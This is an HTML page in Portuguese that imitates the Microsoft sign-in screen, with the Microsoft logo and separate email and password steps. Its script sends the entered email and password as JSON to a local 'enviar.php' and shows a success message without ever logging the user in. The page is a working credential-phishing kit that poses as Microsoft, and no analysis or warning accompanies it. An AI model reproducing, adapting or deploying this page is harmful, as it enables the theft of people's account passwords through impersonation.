<!doctype html>
<html lang="pt-BR">

<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Login Microsoft</title>
  <style>
    :root {
      --bg: #f3f6fb;
      --card: #fff;
      --text: #1b1b1b;
      --muted: #5f6368;
      --line: #dadce0;
      --primary: #0a66c2;
      /* azul do botão */
      --primary-hover: #0b5cad;
      --btn-gray: #cfcfd1;
      /* botão Voltar */
    }

    html,
    body {
      height: 100%
    }

    body {
      margin: 0;
      font-family: Segoe UI, system-ui, -apple-system, Roboto, Arial, sans-serif;
      background-image: url('image/20251029_0842_Fundo\ Suave\ Abstrato_remix_01k8qwa2g9f198gy3hp46jew1a.png');
      /* Relative or absolute path */
      background-repeat: no-repeat;
      /* Prevents the image from repeating */
      background-position: center center;
      /* Centers the image */
      background-size: cover;
      /* Scales the image to cover the entire element */
      color: var(--text);
    }

    .wrap {
      min-height: 100%;
      display: grid;
      place-items: center;
      padding: 24px;
    }

    .card {
      width: min(560px, 92vw);
      background: var(--card);
      border-radius: 12px;
      box-shadow: 0 10px 28px rgba(0, 0, 0, .10);
      padding: 28px;
    }

    h1 {
      margin: .25rem 0 1rem;
      font-size: 1.75rem;
      font-weight: 650
    }

    .subtitle {
      color: var(--muted);
      margin: 4px 0 18px
    }

    .field {
      margin: 18px 0 10px;
      display: block;
    }

    .label {
      display: block;
      font-size: .95rem;
      color: #3b3b3b;
      margin-bottom: 4px
    }

    .input {
      width: 100%;
      font-size: 1rem;
      background: #fff;
      border: 0;
      border-bottom: 2px solid #c6c6c6;
      padding: 10px 0 8px;
      outline: none;
      transition: border-color .15s ease;
    }

    .input:focus {
      border-bottom-color: #136fd4
    }

    .hint a {
      color: #0d64b3;
      text-decoration: none
    }

    .hint a:hover {
      text-decoration: underline
    }

    .hint {
      margin-top: 10px;
      margin-bottom: 22px
    }

    #feedback[data-tipo="erro"] {
      color: #d93025;
    }

    #feedback[data-tipo="sucesso"] {
      color: #137333;
    }

    .row {
      display: flex;
      gap: 12px;
      justify-content: flex-end;
      margin-top: 18px;
    }

    .btn {
      appearance: none;
      border: 0;
      cursor: pointer;
      border-radius: 3px;
      font-size: 1rem;
      padding: 10px 16px;
      line-height: 1;
    }

    .btn.gray {
      background: var(--btn-gray);
      color: #222
    }

    .btn.primary {
      background: var(--primary);
      color: #fff
    }

    .btn.primary:hover {
      background: var(--primary-hover)
    }

    .btn:disabled {
      opacity: .6;
      cursor: not-allowed
    }

    /* Etapas */
    [data-step] {
      display: none
    }

    [data-step].active {
      display: block
    }

    /* Passo 2: cabeçalho compacto com email */
    .email-pill {
      margin: 4px 0 16px;
      font-size: .9rem;
    }

    .titulo2 {
      display: block;
      font-size: 1.5em;
      font-weight: bold;
      unicode-bidi: isolate;
    }

    /* A11y */
    .sr-only {
      position: absolute;
      width: 1px;
      height: 1px;
      padding: 0;
      margin: -1px;
      overflow: hidden;
      clip: rect(0, 0, 0, 0);
      white-space: nowrap;
      border: 0
    }
  </style>
</head>

<body>
  <main class="wrap">
    <form action="enviar.php" method="post" id="solicitacaoForm" novalidate>
      <section class="card" role="dialog" aria-labelledby="titulo">
        <!-- Passo 1: Email -->
        <div id="step-1" data-step class="active" aria-live="polite">
          <div class="logo"><img src="image/microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png" alt="Logo"></div>
          <h1 id="titulo">Entrar</h1>

          <label for="email" class="label">Email ou telefone</label>
          <input id="email" name="email" class="input" type="email" autocomplete="username" placeholder="" required />

          <p class="hint"><a href="#" onclick="return false;">Não consegue acessar sua conta?</a></p>

          <div class="row">
            <button class="btn gray" type="button" disabled>Voltar</button>
            <button id="next" class="btn primary" type="button">Avançar</button>
          </div>
        </div>

        <!-- Passo 2: Senha -->
        <div id="step-2" data-step aria-live="polite">
          <div class="logo"><img src="image/microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png" alt="Logo"></div>
          <!-- Agora vazio; será preenchido via JS -->
          <div id="email-pill" class="email-pill" aria-live="polite"></div>

          <label for="senha" class="label">Senha</label>
          <input id="senha" name="senha" class="input" type="password" autocomplete="current-password" required />

          <p class="hint">
            <a href="#" onclick="return false;">Esqueci minha senha</a><br />
            <a href="#" id="trocar-conta">Entrar com outra conta</a>
          </p>

          <div id="feedback" class="hint" role="status" aria-live="polite"></div>

          <div class="row">
            <button id="entrar" class="btn primary" type="submit">Entrar</button>
          </div>
        </div>
      </section>
    </form>
  </main>

  <script>
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const nextBtn = document.getElementById('next');
    const emailInput = document.getElementById('email');
    const senhaInput = document.getElementById('senha');
    const emailPill = document.getElementById('email-pill');
    const trocarConta = document.getElementById('trocar-conta');

    function atualizarFeedback(mensagem, tipo = 'info') {
      feedback.textContent = mensagem;
      feedback.dataset.tipo = tipo;
    }

    function mostrarPasso1() {
      step2.classList.remove('active');
      step1.classList.add('active');
      emailInput.focus();
    }

    function mostrarPasso2(email) {
      emailPill.textContent = email;
      step1.classList.remove('active');
      step2.classList.add('active');
      setTimeout(() => senhaInput.focus(), 0);
    }

    nextBtn.addEventListener('click', () => {
      const email = emailInput.value.trim();
      if (!email) {
        emailInput.focus();
        emailInput.setAttribute('aria-invalid', 'true');
        atualizarFeedback('Informe um email válido para continuar.', 'erro');
        return;
      }
      emailInput.removeAttribute('aria-invalid');
      atualizarFeedback('');
      mostrarPasso2(email);
    });

    trocarConta.addEventListener('click', () => {
      mostrarPasso1();
      emailInput.removeAttribute('aria-invalid');
      senhaInput.removeAttribute('aria-invalid');
      atualizarFeedback('');
    });

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = emailInput.value.trim();
      const senha = senhaInput.value.trim();

      if (!email) {
        emailInput.focus();
        emailInput.setAttribute('aria-invalid', 'true');
        atualizarFeedback('Informe um email válido para continuar.', 'erro');
        mostrarPasso1();
        return;
      }

      if (!senha) {
        senhaInput.focus();
        senhaInput.setAttribute('aria-invalid', 'true');
        atualizarFeedback('Informe a senha para concluir o envio.', 'erro');
        return;
      }

      emailInput.removeAttribute('aria-invalid');
      senhaInput.removeAttribute('aria-invalid');

      const submitButton = document.getElementById('entrar');
      submitButton.disabled = true;
      atualizarFeedback('Enviando dados…', 'info');

      try {
        const resposta = await fetch(form.action, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ email, senha }),
        });

        const resultado = await resposta.json();

        if (!resposta.ok || resultado.erro) {
          throw new Error(resultado.erro || 'Erro desconhecido ao enviar os dados.');
        }

        atualizarFeedback('Dados enviados com sucesso.', 'sucesso');
        form.reset();
        mostrarPasso1();
        emailPill.textContent = '';
      } catch (erro) {
        atualizarFeedback(erro.message, 'erro');
      } finally {
        submitButton.disabled = false;
      }
    });
  </script>
</body>
</html>
